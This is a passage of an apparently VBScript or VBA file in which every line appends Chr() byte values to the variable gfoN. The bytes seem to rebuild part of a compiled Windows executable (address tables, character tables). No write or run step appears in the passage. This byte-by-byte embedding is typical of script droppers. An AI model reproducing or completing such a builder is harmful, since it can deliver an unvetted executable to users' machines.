gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(186)&Chr(20)&Chr(64)&Chr(0)
gfoN=gfoN&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(112)&Chr(134)&Chr(64)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(134)&Chr(64)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(134)&Chr(64)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(133)&Chr(64)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(133)&Chr(64)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(36)&Chr(133)&Chr(64)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(64)&Chr(0)&Chr(19)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(132)&Chr(64)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)&Chr(156)&Chr(132)&Chr(64)&Chr(0)&Chr(25)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(132)&Chr(64)&Chr(0)&Chr(26)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(132)&Chr(64)&Chr(0)&Chr(27)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(132)&Chr(64)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(220)&Chr(131)&Chr(64)&Chr(0)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(188)&Chr(131)&Chr(64)&Chr(0)&Chr(31)&Chr(0)&Chr(0)&Chr(0)&Chr(88)&Chr(131)&Chr(64)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(131)&Chr(64)&Chr(0)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(40)&Chr(130)&Chr(64)&Chr(0)&Chr(34)&Chr(0)&Chr(0)&Chr(0)&Chr(136)&Chr(129)&Chr(64)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(129)&Chr(64)&Chr(0)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(129)&Chr(64)&Chr(0)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(129)&Chr(64)&Chr(0)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(129)&Chr(64)&Chr(0)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(129)&Chr(64)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(128)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(109)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(112)&Chr(0)&Chr(0)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(130)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(145)&Chr(0)&Chr(0)&Chr(0)&Chr(41)&Chr(0)&Chr(0)&Chr(0)&Chr(158)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(164)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(167)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(183)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(206)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(215)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(7)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)
gfoN=gfoN&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)
gfoN=gfoN&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
